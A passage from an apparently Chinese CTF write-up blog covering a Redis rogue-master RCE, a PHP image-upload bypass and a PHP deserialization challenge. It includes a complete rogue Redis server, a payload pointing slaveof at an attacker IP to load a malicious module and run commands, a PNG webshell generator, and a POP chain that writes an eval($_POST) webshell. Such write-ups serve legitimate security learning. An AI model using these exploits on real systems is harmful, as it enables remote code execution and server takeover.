<li>因此通过FULLRESYNC写入恶意so文件，然后MODULE LOAD &#x2F;path&#x2F;to&#x2F;mymodule.so载入模块即可rce</li>
</ul>
<p>不太难理解，也就是准备个恶意的master服务器就好。</p>
<ul>
<li>根据<a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">redis-rogue-getshell</a>的代码，改一个master server出来。exp.so编译下里面的RedisModulesSDK&#x2F;exp&#x2F;exp.c得到<br>| &#96;&#96;&#96;python<br>import os<br>import sys<br>import argparse<br>import socketserver<br>import logging<br>import socket<br>import time</li>
</ul>
<p>logging.basicConfig(stream&#x3D;sys.stdout, level&#x3D;logging.INFO, format&#x3D;’&gt;&gt; %(message)s’)</p>
<p>DELIMITER &#x3D; b”\r\n”</p>
<p>class RoguoHandler(socketserver.BaseRequestHandler):<br>    def decode(self, data):<br>        if data.startswith(b’*’):<br>            return data.strip().split(DELIMITER)[2::2]<br>        if data.startswith(b’$’):<br>            return data.split(DELIMITER, 2)[1]</p>
<pre><code>    return data.strip().split()

def handle(self):
    while True:
        data = self.request.recv(1024)
        logging.info(&quot;receive data: %r&quot;, data)
        arr = self.decode(data)
        if arr[0].startswith(b&#39;PING&#39;):
            self.request.sendall(b&#39;+PONG&#39; + DELIMITER)
        elif arr[0].startswith(b&#39;REPLCONF&#39;):
            self.request.sendall(b&#39;+OK&#39; + DELIMITER)
        elif arr[0].startswith(b&#39;PSYNC&#39;) or arr[0].startswith(b&#39;SYNC&#39;):
            self.request.sendall(b&#39;+FULLRESYNC &#39; + b&#39;Z&#39; * 40 + b&#39; 1&#39; + DELIMITER)
            self.request.sendall(b&#39;$&#39; + str(len(self.server.payload)).encode() + DELIMITER)
            self.request.sendall(self.server.payload + DELIMITER)
            break

    self.finish()

def finish(self):
    self.request.close()
</code></pre>
<p>class RoguoServer(socketserver.TCPServer):<br>    allow_reuse_address &#x3D; True</p>
<pre><code>def __init__(self, server_address, payload):
    super(RoguoServer, self).__init__(server_address, RoguoHandler, True)
    self.payload = payload
</code></pre>
<p>if <strong>name</strong>&#x3D;&#x3D;’<strong>main</strong>‘:<br>    expfile &#x3D; ‘exp.so’<br>    lport &#x3D; 6379<br>    with open(expfile, ‘rb’) as f:<br>        server &#x3D; RoguoServer((‘0.0.0.0’, lport), f.read())<br>    server.handle_request()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> |</span><br><span class="line">| --- |</span><br><span class="line"></span><br><span class="line">放到vps运行，然后gopher脚本还是上面我给的格式，最终payload如下</span><br></pre></td></tr></table></figure>
<p>*2<br>$4<br>AUTH<br>$4<br>root<br>*1<br>$7<br>COMMAND<br>*3<br>$7<br>slaveof<br>$12<br>174.2.41.117<br>$4<br>6379<br>*3<br>$6<br>module<br>$4<br>load<br>$10<br>.&#x2F;dump.rdb<br>*2<br>$11<br>system.exec<br>$9<br>cat &#x2F;flag<br>*1<br>$4<br>quit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">详细可以参考</span><br><span class="line">[https://inhann.top/2021/09/14/redis_master_slave_rce/](https://inhann.top/2021/09/14/redis_master_slave_rce/)</span><br><span class="line">看了一遍讲的很全</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># [CISCN2021 Quals]upload</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">if (!isset($_GET[&quot;ctf&quot;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&quot;ctf&quot;]))</span><br><span class="line">    $ctf = $_GET[&quot;ctf&quot;];</span><br><span class="line"></span><br><span class="line">if($ctf==&quot;upload&quot;) &#123;</span><br><span class="line">    if ($_FILES[&#x27;postedFile&#x27;][&#x27;size&#x27;] &gt; 1024*512) &#123;</span><br><span class="line">        die(&quot;这么大个的东西你是想d我吗？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $imageinfo = getimagesize($_FILES[&#x27;postedFile&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">    if ($imageinfo === FALSE) &#123;</span><br><span class="line">        die(&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123;</span><br><span class="line">        die(&quot;东西不能方方正正的话就很讨厌&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $fileName=urldecode($_FILES[&#x27;postedFile&#x27;][&#x27;name&#x27;]);</span><br><span class="line">    if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) &#123;</span><br><span class="line">        die(&quot;有些东西让你传上去的话那可不得了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $imagePath = &quot;image/&quot; . mb_strtolower($fileName);</span><br><span class="line">    if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) &#123;</span><br><span class="line">        echo &quot;upload success, image at $imagePath&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;传都没有传上去&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还扫到个example.php文件，解压用的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">\ZipArchive</span>();</span><br><span class="line">    <span class="variable">$name_for_zip</span> = <span class="string">&quot;example/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>)[<span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>))-<span class="number">1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;要不咱们再看看？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$name_for_zip</span>) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;都不能解压呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;可以解压，我想想存哪里&quot;</span>;</span><br><span class="line">    <span class="variable">$pos_for_zip</span> = <span class="string">&quot;/tmp/example/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="variable">$pos_for_zip</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$name_for_zip</span>);</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">glob</span>(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$first</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">min</span>(<span class="title function_ invoke__">imagesx</span>(<span class="variable">$first</span>), <span class="title function_ invoke__">imagesy</span>(<span class="variable">$first</span>));</span><br><span class="line">        <span class="variable">$second</span> = <span class="title function_ invoke__">imagecrop</span>(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$final_name</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            <span class="title function_ invoke__">imagepng</span>(<span class="variable">$second</span>, <span class="string">&#x27;example/&#x27;</span>.<span class="variable">$final_name</span>);</span><br><span class="line">            <span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$second</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$first</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一题其实就是mb_strtolower函数的一个trick，虽然限制了文件名。但是这个函数可以识别unicode字符。然后由于unicode里好像没有替换p和h的，所以直接替换不了php，因此题目给出了个zip格式，也就是替换i，所以我们的思路就是上传一个恶意的zip然后解压。getshell<br>制作恶意的图片，用之前文件上传的tool制作。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>); <span class="comment">#保存在本地的图片马</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后是unicode字符的fuzz。<br><a target="_blank" rel="noopener" href="https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/">https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/</a><br><code>i</code>等价于<code>%C4%B0</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683463947174-923e608c-d731-4ac6-89ca-63c79fc1f2fb.png#averageHue=%232e2e2d&clientId=u18ad4f6b-e694-4&from=paste&height=875&id=ud28399d5&originHeight=875&originWidth=1246&originalType=binary&ratio=1&rotation=0&showTitle=false&size=136065&status=done&style=none&taskId=ub36db4a3-a2e7-40a4-bba6-e14494687a6&title=&width=1246" alt="image.png"><br>并且使用<br>#define width 1<br>#define height 1<br>去绕过长宽的限制。得到了上传路径，那就是image&#x2F;1.zip，之后去解压。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683463826428-bc8b8cdf-e874-427c-bc74-a6667b5ccf2b.png#averageHue=%23d8d8d8&clientId=u18ad4f6b-e694-4&from=paste&height=1342&id=uef32894f&originHeight=1342&originWidth=1862&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61094&status=done&style=none&taskId=uf916af27-312b-459b-8f24-73db42c41a8&title=&width=1862" alt="image.png"><br>利用的是imagepng函数去储存。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683463852285-5a1973c7-f8d8-4a0f-8385-f188d9faf50e.png#averageHue=%239e9e9d&clientId=u18ad4f6b-e694-4&from=paste&height=1028&id=u14ab35db&originHeight=1028&originWidth=1876&originalType=binary&ratio=1&rotation=0&showTitle=false&size=220093&status=done&style=none&taskId=u263e06fa-ecb1-41c5-85cf-72d2e503416&title=&width=1876" alt="image.png"><br>然后直接访问<code>example/1.php</code>就好。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683464287276-88de152c-e059-4ebf-b9aa-091d2d93888c.png#averageHue=%23d7d7d7&clientId=u18ad4f6b-e694-4&from=paste&height=1348&id=u04452099&originHeight=1348&originWidth=1346&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58263&status=done&style=none&taskId=u8b36a6a9-72ee-4312-bcf9-c80904447f7&title=&width=1346" alt="image.png"><br>绕这么多层。还在etc。</p>
<h1 id="羊城杯-2020-EasySer"><a href="#羊城杯-2020-EasySer" class="headerlink" title="[羊城杯 2020]EasySer"></a>[羊城杯 2020]EasySer</h1><p>考点：绕死亡exit、ssrf读文件<br>其实我对藏参数的题一律都是当成傻逼处理的。至少在我这里是这样。藏nm</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hero = <span class="keyword">new</span> <span class="title class_">Yasuo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hero-&gt;<span class="title function_ invoke__">hasaki</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; text = <span class="variable">$text</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$a</span>= <span class="variable">$d</span>. <span class="variable language_">$this</span>-&gt;text;</span><br><span class="line">         @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt; file,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是ser.php的内容，源码有提示，robots.txt告诉我们题目的入口，然后才来的上一步<br>问题是不知道序列化点是吧，所以说藏参数不评价。参数是c。反序列化的点。那pop链就不需要说啥了，简单构造下即可。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; text = <span class="variable">$text</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">GWHT</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Yongen</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;file=<span class="string">&quot;php://filter/convert.base64-decode/resource=boogipop.php&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;text=<span class="string">&quot;aaaaaaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;hero=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683466248960-d2c79464-98e8-401b-9ba1-d19e810a6257.png#averageHue=%231c1b1b&clientId=u18ad4f6b-e694-4&from=paste&height=168&id=u7bd30a95&originHeight=168&originWidth=2468&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37960&status=done&style=none&taskId=u1e67d018-c8ef-497c-9f72-712589641c8&title=&width=2468" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683466200714-29850cb9-4ef2-4fa9-8d21-f2343ee720f4.png#averageHue=%23fefdfd&clientId=u18ad4f6b-e694-4&from=paste&height=554&id=u47d0848a&originHeight=554&originWidth=1132&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56717&status=done&style=none&taskId=u2a6a1de2-ba32-4c98-983f-84c55c0bcd4&title=&width=1132" alt="image.png"><br>蚁剑连接后看了下源码，发现真是傻。<br>既然打不过，那就用魔法打败魔法。<br><a target="_blank" rel="noopener" href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a><br>这个工具用来杀死藏参数的<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683466346956-f3f44712-8fc6-4eb7-bda6-51177d2bcb22.png#averageHue=%23635a4f&clientId=u18ad4f6b-e694-4&from=paste&height=48&id=u724b5b62&originHeight=48&originWidth=48&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4297&status=done&style=none&taskId=ud32084ee-065d-4475-a7de-f9be4052dd9&title=&width=48" alt="00CFBF88.png">揭开他们的面纱<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683466376480-e09f1271-607a-4d7c-ac98-e32cadf580e9.png#averageHue=%23f3f3f3&clientId=u18ad4f6b-e694-4&from=paste&height=374&id=u36d229b4&originHeight=374&originWidth=1163&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19783&status=done&style=none&taskId=u2954b885-bd8e-4a30-ad45-8dcd7fa17b6&title=&width=1163" alt="image.png"></p>
<h1 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h1><p>考点：nodejs的无数字字母rce</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 